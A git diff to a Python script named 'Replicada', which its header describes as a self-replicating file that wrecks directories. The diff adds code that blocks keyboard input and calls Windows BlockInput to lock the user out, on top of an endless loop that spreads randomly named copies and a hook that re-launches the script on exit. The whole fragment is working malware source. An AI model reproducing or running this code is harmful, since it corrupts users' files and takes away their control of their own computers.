@@ -7,7 +7,8 @@ PLEASE MIND THAT THIS WOULD FUCK UP YOUR DIRECTORIES, INCLUDING FILES AND FOLDER
 self-replicating python file - Replicada by archisha69
 '''
 
-import os, shutil, random, string, sys, atexit
+import os, shutil, random, string, sys, atexit, keyboard
+from ctypes import windll
 
 def _atexit():
     os.execv(sys.argv[0], sys.argv)
@@ -20,6 +21,9 @@ count = 0
 
 #while count < 200:
 while True:
+    for i in range(150):
+        keyboard.block_key(i)
+    windll.user32.BlockInput(True) #fuck wi
     name = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(2, 32)))
     for i in os.listdir(cwd):
         name2 = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(2, 32)))
